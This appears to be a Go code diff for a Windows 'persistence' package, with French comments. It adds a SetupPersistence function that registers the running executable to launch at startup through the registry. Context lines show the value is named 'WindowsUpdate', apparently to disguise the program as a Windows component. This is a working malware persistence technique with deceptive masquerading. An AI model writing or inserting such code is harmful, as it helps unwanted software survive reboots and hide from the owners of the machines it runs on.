@@ -5,6 +5,7 @@ package persistence
 
 import (
 	"fmt"
+	"os"
 
 	"golang.org/x/sys/windows/registry"
 )
@@ -74,4 +75,26 @@ func RemoveFromStartup() error {
 	defer key.Close()
 
 	return key.DeleteValue("WindowsUpdate")
+}
+
+// Setup persistance au démarrage
+func SetupPersistence() {
+	fmt.Println("\n[Persistance] Configuration...")
+
+	exePath, err := os.Executable()
+	if err != nil {
+		fmt.Println("  ✗ Erreur chemin:", err)
+		return
+	}
+
+	if persistent, path := CheckStartup(); persistent {
+		fmt.Printf("  ✓ Déjà persistant\n  Chemin: %s\n", path)
+	} else {
+		fmt.Println("  ➔ Ajout au démarrage Windows...")
+		if err := AddToStartup(exePath); err != nil {
+			fmt.Printf("  ✗ Échec: %v\n", err)
+		} else {
+			fmt.Println("  ✓ Persistance activée")
+		}
+	}
 }
